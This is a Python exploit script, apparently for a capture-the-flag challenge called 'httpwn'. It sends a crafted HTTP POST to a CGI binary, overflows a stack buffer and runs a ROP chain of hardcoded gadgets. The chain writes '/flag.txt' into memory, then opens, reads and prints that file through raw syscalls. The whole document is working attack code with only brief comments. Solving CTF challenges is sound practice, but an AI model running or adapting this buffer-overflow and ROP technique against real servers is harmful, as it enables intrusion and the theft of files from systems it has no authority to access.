#!/usr/bin/env python3
import socket
import struct

def p64(x): return struct.pack("<Q", x)

# ===== Fill these in =====
TARGET_HOST = "gzcli.techcomfest.1pc.tf"   # instance IP or hostname
TARGET_PORT = 63925            # replace if not 80
PATH = "/cgi-bin/httpwn.cgi"

# ===== Gadgets / addrs from provided httpwn.cgi (no PIE, static) =====
pop_rdi      = 0x402151
pop_rsi      = 0x4047bb
pop_rdx_rbx  = 0x45f4b7
pop_rax      = 0x424d82
mov_qword_rdi_rdx = 0x41ef93
syscall_ret  = 0x410852
xchg_rax_rdx = 0x41d69a

bss = 0x4a6ac0
buf = bss + 0x200

# Offset from start of `data` to saved RIP
OFFSET_RET = 0x68

def build_rop():
    # write "/flag.txt\x00" into .bss using mov [rdi], rdx; ret
    s1 = b"/flag.tx"                         # 8 bytes
    s2 = b"t\x00\x00\x00\x00\x00\x00\x00"    # 8 bytes
    v1 = int.from_bytes(s1, "little")
    v2 = int.from_bytes(s2, "little")

    rop = b"".join([
        # *(uint64_t*)bss = "/flag.tx"
        p64(pop_rdi), p64(bss),
        p64(pop_rdx_rbx), p64(v1), p64(0),
        p64(mov_qword_rdi_rdx),

        # *(uint64_t*)(bss+8) = "t\0..."
        p64(pop_rdi), p64(bss + 8),
        p64(pop_rdx_rbx), p64(v2), p64(0),
        p64(mov_qword_rdi_rdx),

        # close(0)
        p64(pop_rax), p64(3),
        p64(pop_rdi), p64(0),
        p64(syscall_ret),

        # open(bss, O_RDONLY=0, 0)
        p64(pop_rax), p64(2),
        p64(pop_rdi), p64(bss),
        p64(pop_rsi), p64(0),
        p64(pop_rdx_rbx), p64(0), p64(0),
        p64(syscall_ret),

        # read(0, buf, 0x100)
        p64(pop_rax), p64(0),
        p64(pop_rdi), p64(0),
        p64(pop_rsi), p64(buf),
        p64(pop_rdx_rbx), p64(0x100), p64(0),
        p64(syscall_ret),

        # rdx = rax (number of bytes actually read)
        p64(xchg_rax_rdx),

        # write(1, buf, rdx)
        p64(pop_rax), p64(1),
        p64(pop_rdi), p64(1),
        p64(pop_rsi), p64(buf),
        p64(syscall_ret),

        # exit(0)
        p64(pop_rax), p64(60),
        p64(pop_rdi), p64(0),
        p64(syscall_ret),
    ])
    return rop

def build_body():
    # Make strcpy harmless: username="AAAA\0"
    prefix = b"username=" + b"A"*4 + b"\x00"
    rop = build_rop()
    pad = b"B" * (OFFSET_RET - len(prefix))
    return prefix + pad + rop

def exploit():
    body = build_body()

    req = b"".join([
        f"POST {PATH} HTTP/1.1\r\n".encode(),
        f"Host: {TARGET_HOST}\r\n".encode(),
        b"Content-Type: application/x-www-form-urlencoded\r\n",
        f"Content-Length: {len(body)}\r\n".encode(),
        b"Connection: close\r\n",
        b"\r\n",
        body
    ])

    s = socket.create_connection((TARGET_HOST, TARGET_PORT))
    s.sendall(req)

    data = b""
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
    s.close()

    # Split HTTP headers from body
    _, _, resp_body = data.partition(b"\r\n\r\n")
    # The CGI-generated headers are handled by Apache, so resp_body should basically be the flag
    print(resp_body.decode(errors="ignore"))

if __name__ == "__main__":
    exploit()
